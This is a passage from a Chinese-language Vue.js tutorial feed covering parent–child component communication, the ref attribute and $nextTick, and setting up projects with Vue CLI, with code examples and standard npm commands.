</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">  App.vue
</span></span></span><span class="line"><span class="cl"><span class="c"> --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 将通知信息更新的函数传递给组件 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">user-input</span> <span class="na">:setUserInfo</span><span class="o">=</span><span class="s">&#34;setUserInfo&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 点击登录按钮显示用户信息 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;login&#34;</span><span class="p">&gt;</span>登录<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">UserInput</span> <span class="nx">from</span> <span class="s1">&#39;./components/user-input.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">UserInput</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">userInfo</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">account</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 通知组件用户信息被更新
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">setUserInfo</span><span class="p">(</span><span class="nx">userInfo</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">account</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">hasOwn</span><span class="p">(</span><span class="nx">userInfo</span><span class="p">,</span> <span class="s2">&#34;account&#34;</span><span class="p">)</span> <span class="o">?</span>
</span></span><span class="line"><span class="cl">                              <span class="nx">userInfo</span><span class="p">.</span><span class="nx">account</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">hasOwn</span><span class="p">(</span><span class="nx">userInfo</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">)</span> <span class="o">?</span>
</span></span><span class="line"><span class="cl">                              <span class="nx">userInfo</span><span class="p">.</span><span class="nx">password</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">login</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">alert</span><span class="p">(</span><span class="sb">`账号：</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">account</span><span class="si">}</span><span class="sb">\n密码：</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">password</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>该方法的原理就是：被父组件传递给子组件用于更新的函数，它的<code>this</code>指向的仍是父组件的实例对象。简单来说就是<u>子组件调用了一个父组件的方法来通知父组件</u>。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 获取页面元素及延迟执行</title>
      <link>/docs/vue/components/ref-and-nexttick/</link>
      <pubDate>Mon, 18 Sep 2023 01:16:55 +0000</pubDate>
      
      <guid>/docs/vue/components/ref-and-nexttick/</guid>
      <description><![CDATA[ref 属性 在Vue的模板中可以通过为元素或子组件添加ref属性（如ref=&quot;elementRefValue&quot;）来告诉Vue实]]></description>
      <content:encoded><![CDATA[<h1 id="ref-属性" data-numberify>ref 属性<a class="anchor ms-1" href="#ref-属性"></a></h1>
<p>在Vue的模板中可以通过为元素或子组件添加<code>ref</code>属性（如<code>ref=&quot;elementRefValue&quot;</code>）来告诉Vue实例（或组件实例）要获取该元素。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;msg&#34;</span> <span class="na">ref</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>  <span class="c">&lt;!-- 获取Html内置标签元素 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">MySite</span> <span class="na">ref</span><span class="o">=</span><span class="s">&#34;site&#34;</span><span class="p">/&gt;</span>  <span class="c">&lt;!-- 获取Vue组件 --&gt;</span>
</span></span></code></pre></div><p>在Vue中，<u><code>ref</code>属性被用来给元素或子组件注册引用信息</u>。</p>
<p>然后在Vue实例或组件实例中，通过<code>this.$refs.elementRefValue</code>来获取该元素或子组件的对象。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">title</span>  <span class="c1">// 获取真实DOM元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">site</span>   <span class="c1">// 获取组件实例对象
</span></span></span></code></pre></div><ul>
<li>如果<code>ref</code>在Html内置标签上使用，那么<code>this.$refs.elementRefValue</code>获取到的是该元素的真实DOM元素。</li>
<li>如果<code>ref</code>在Vue组件标签上使用，那么<code>this.$refs.elementRefValue</code>获取到的是该组件的<code>VueComponent</code>对象。</li>
</ul>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;msg&#34;</span> <span class="na">ref</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;showDom&#34;</span><span class="p">&gt;</span>输出上方DOM<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">MySite</span> <span class="na">ref</span><span class="o">=</span><span class="s">&#34;site&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 引入组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">MySite</span> <span class="nx">from</span> <span class="s2">&#34;./components/MySite.vue&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">MySite</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">showDom</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">);</span>        <span class="c1">// 获取模板中所有使用了 ref 属性的元素或组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">title</span><span class="p">);</span>  <span class="c1">// 获取真实DOM元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">site</span><span class="p">);</span>   <span class="c1">// 获取组件实例对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="nexttick-延迟执行" data-numberify>nextTick 延迟执行<a class="anchor ms-1" href="#nexttick-延迟执行"></a></h1>
<p>假设有如下组件，需要在点击编辑按钮时显示输入框并且自动获取焦点：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;!isEdit&#34;</span><span class="p">&gt;</span>{{name}}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;isEdit&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;name&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">ref</span><span class="o">=</span><span class="s">&#34;input&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">&#34;handleBlur&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="na">blur</span><span class="o">=</span><span class="s">&#34;handleBlur&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;!isEdit&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;isEdit = true&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    编辑
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;张三&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isEdit</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">handleBlur</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">isEdit</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">$ref</span><span class="p">.</span><span class="nx">input</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>但是运行后发现，<code>&lt;input&gt;</code>并不能自动获取焦点。</p>
<p>产生这个问题的原因是，<code>this.$ref.input.focus()</code>执行的时机在组件DOM更新完成之前。即，点击编辑按钮之后，组件调用<code>this.handleBlur()</code>，等到<code>this.handleBlur()</code>执行完成时，组件才开始重新解析页面。</p>
<p>想要让<code>this.$ref.input.focus()</code>在下次DOM更新完成之后才执行，可以使用Vue提供的<code>this.$nextTick(callback)</code>（<code>this</code>指Vue或组件实例）。</p>
<p><code>this.$nextTick(callback)</code>需要传入一个回调。当执行到<code>this.$nextTick(callback)</code>时，Vue并不会立即执行回调，而是等到数据更新完毕，且DOM更新完成之后才执行<code>callback</code>。</p>
<blockquote>
<p>当<code>callback</code>使用<code>function</code>定义时，<code>callback</code>中的<code>this</code>指向的是当前Vue或组件实例。</p>
</blockquote>
<p>也就是说，<code>this.$nextTick(callback)</code>可以让<code>callback</code>在<u>下一次DOM更新结束之后执行</u>。</p>
<p>例如，修改上方案例中的<code>handleBlur()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">handleBlur</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">isEdit</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 模板重新解析完成后才自动获取焦点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// $nextTick() 指定的回调，会在下次DOM更新完成之后才执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">this</span><span class="p">.</span><span class="nx">$nextTick</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">input</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><blockquote>
<p><code>nextTick</code>的使用场景：当改变数据后，要基于更新之后的新DOM进行某些操作时。</p>
<p>其实还有一种解决方法，就是使用一个不带时间、立即执行的定时器：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">handleBlur</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">isEdit</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">input</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这是因为<code>setTimeout()</code>即使不带时间，它也会将回调推向一个队列去执行，所以本质上来说并不算立即执行。</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 项目开发</title>
      <link>/docs/vue/components/projects/</link>
      <pubDate>Sat, 16 Sep 2023 07:47:27 +0000</pubDate>
      
      <guid>/docs/vue/components/projects/</guid>
      <description><![CDATA[单文件组件 Vue单文件组件是指使用由Vue定义的.vue格式的文件。.vue文件模板如下： &lt;!-- Vue 只能包含以下三种标签 --&gt; &lt;!-- 组件的结构 --&gt; &lt;template&gt; &lt;!-- ... --&gt; &lt;/template&gt;]]></description>
      <content:encoded><![CDATA[<h1 id="单文件组件" data-numberify>单文件组件<a class="anchor ms-1" href="#单文件组件"></a></h1>
<p>Vue单文件组件是指使用由Vue定义的<code>.vue</code>格式的文件。<code>.vue</code>文件模板如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- Vue 只能包含以下三种标签 --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 组件的结构 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- ... --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 组件交互相关的代码（数据、方法等等） --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 组件的样式 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>其中：</p>
<ul>
<li>
<p><code>&lt;template&gt;</code>：用于定义组件的结构。相当于组件配置中的<code>template</code>配置项。</p>
<p>和Html中的<code>&lt;template&gt;</code>一样，它不会影响页面最终的结构。</p>
<p>由于<code>&lt;template&gt;</code>不会影响页面结构，所以在<code>&lt;template&gt;</code>中还需要定义一个元素作为整个组件的根节点。</p>
</li>
<li>
<p><code>&lt;script&gt;</code>：定义组件的交互相关的代码。即定义创建组件的JS代码。</p>
<p>在<code>&lt;script&gt;</code>中可以使用<code>Vue.extend()</code>来创建组件。但是由于Vue会在需要的时候帮我们自动调用<code>Vue.extend()</code>，所以<code>Vue.extend()</code>可省略。<u>一般情况下<code>export default</code>组件的配置对象即可</u>。</p>
<blockquote>
<p>如果要使用<code>Vue.extend()</code>，需要先引入<code>Vue</code>。</p>
</blockquote>
</li>
<li>
<p><code>&lt;style&gt;</code>：和Html中的<code>&lt;style&gt;</code>一样，都是用于定义样式。</p>
</li>
<li>
<p><code>.vue</code>注释：</p>
<p><code>.vue</code>中的文件有4个地方可以写注释：</p>
<ul>
<li>
<p><code>&lt;template&gt;</code>中：使用Html的注释<code>&lt;!-- 注释内容 --&gt;</code>。</p>
</li>
<li>
<p><code>&lt;script&gt;</code>中：使用JS的注释<code>// 注释内容</code>或<code>/* 注释内容 */</code>。</p>
</li>
<li>
<p><code>&lt;style&gt;</code>中：使用CSS的注释<code>/* 注释内容 */</code>。</p>
</li>
<li>
<p>上述范围之外的其它地方：也就是在<code>&lt;template&gt;</code>、<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>之外的其它地方可以使用注释。这些注释是属于<code>.vue</code>文件自己的注释，一共有3种注释类型：</p>
<pre tabindex="0"><code>&lt;!-- 注释内容 --&gt;
// 注释内容
/* 注释内容 */
</code></pre><p>也就是说，<code>&lt;template&gt;</code>、<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>之外的其它地方可以使用Html、JS和CSS的任何类型的注释。</p>
</li>
</ul>
</li>
</ul>
<hr>
<h1 id="vue-cli" data-numberify>Vue CLI<a class="anchor ms-1" href="#vue-cli"></a></h1>
<p>由于浏览器并不支持直接浏览<code>.vue</code>类型的文件，所以需要将<code>.vue</code>类型的文件编译成浏览器支持的文件类型。而Vue CLI（Vue Command Line Interface，Vue脚手架）可以帮助我们快速地编译<code>.vue</code>。</p>
<h2 id="安装-vue-cli" data-numberify>安装 Vue CLI<a class="anchor ms-1" href="#安装-vue-cli"></a></h2>
<p>Vue CLI需要使用<code>npm</code>安装，请确保你的电脑上已经安装了Node.js。</p>
<p>Vue CLI安装命令如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm install -g @vue/cli
</span></span></code></pre></div><p>安装完成后直接使用<code>vue</code>命令运行Vue CLI。查看Vue CLI版本以验证是否安装成功：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vue -V
</span></span></code></pre></div><h2 id="使用-vue-cli" data-numberify>使用 Vue CLI<a class="anchor ms-1" href="#使用-vue-cli"></a></h2>
<p>使用Vue CLI创建一个项目：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">vue create vue_demo
</span></span></code></pre></div><p>接着Vue CLI会让你选择一个默认的配置：</p>
<p><picture><img class="img-fluid " alt="vue create" src="/docs/vue/components/projects/1694764569709.png" loading="lazy" width="397" height="139" />
</picture>

</p>
<p>使用键盘的<code>↑</code>或<code>↓</code>去移动选择，然后按下回车即可开始创建。</p>
<blockquote>
<p>其中的<code>babel</code>是用来将ES6的代码转换为ES5。<code>eslint</code>是用来进行语法检查。</p>
</blockquote>
<p>出现如下提示表示项目创建成功：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">🎉  Successfully created project vue_demo.
</span></span><span class="line"><span class="cl">👉  Get started with the following commands:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> $ <span class="nb">cd</span> vue_demo
</span></span><span class="line"><span class="cl"> $ npm run serve
</span></span></code></pre></div><p>根据提示信息可以知道，进入<code>vue_demo</code>目录之后运行<code>npm run serve</code>可以启动这个项目：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">cd</span> vue_demo
</span></span><span class="line"><span class="cl">npm run serve
</span></span></code></pre></div><p>启动成功后，项目服务的默认端口是<code>8080</code>，可以访问<code>http://localhost:8080/</code>以浏览Vue CLI为我们创建的<code>HelloWorld</code>这个项目示例。</p>
<h2 id="项目结构" data-numberify>项目结构<a class="anchor ms-1" href="#项目结构"></a></h2>
<p>Vue CLI创建好的项目结构一般如下：</p>
<pre tabindex="0"><code>vue_demo
├── babel.config.js
├── dist
├── .git
├── .gitignore
├── jsconfig.json
├── package.json
├── package-lock.json
├── public
│   ├── favicon.ico
│   └── index.html
├── README.md
├── src
│   ├── App.vue
│   ├── assets
│   │   └── logo.png
│   ├── components
│   │   ├── Hello.vue
│   │   └── SiteUser.vue
│   └── main.js
└── vue.config.js
</code></pre><p>在创建好的<code>vue_demo</code>中，有以下这些注意点：</p>
<ul>
<li>
<p><code>.gitignore</code>：排除那些不需要被<code>git</code>所管理的文件或目录。</p>
</li>
<li>
<p><code>babel.config.js</code>：<code>babel</code>的配置文件。一般来说不需要修改该配置，如果需要修改，可以浏览<a href="https://babeljs.io/" target="_blank" rel="noopener noreferrer">Babel官网<i class="fas fa-external-link-square-alt ms-1"></i></a></p>
</li>
<li>
<p><code>package.json</code>：当前（Node.js）项目的包管理配置文件。</p>
<p>其中需要注意一下的是：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="err">/*</span> <span class="err">...</span> <span class="err">*/</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;scripts&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;serve&#34;</span><span class="p">:</span> <span class="s2">&#34;vue-cli-service serve&#34;</span><span class="p">,</span> <span class="c1">// 预览项目
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nt">&#34;build&#34;</span><span class="p">:</span> <span class="s2">&#34;vue-cli-service build&#34;</span><span class="p">,</span> <span class="c1">// 构建项目
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nt">&#34;lint&#34;</span><span class="p">:</span> <span class="s2">&#34;vue-cli-service lint&#34;</span>    <span class="c1">// 进行语法检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="err">/*</span> <span class="err">...</span> <span class="err">*/</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div></li>
<li>
<p><code>READNE.md</code>：程序说明文档。</p>
</li>
<li>
<p><code>src</code>：项目源代码文件。在使用默认配置的情况下，名称不可随意更改。</p>
<p><code>src</code>的结构如下所示：</p>
<ul>
<li><code>main.js</code>：默认的项目入口文件，主要用来创建Vue实例。在使用默认配置的情况下，名称不可随意更改。</li>
<li><code>App.vue</code>：项目中所有组件的根组件。</li>
<li><code>assets</code>：存放项目的静态资源。</li>
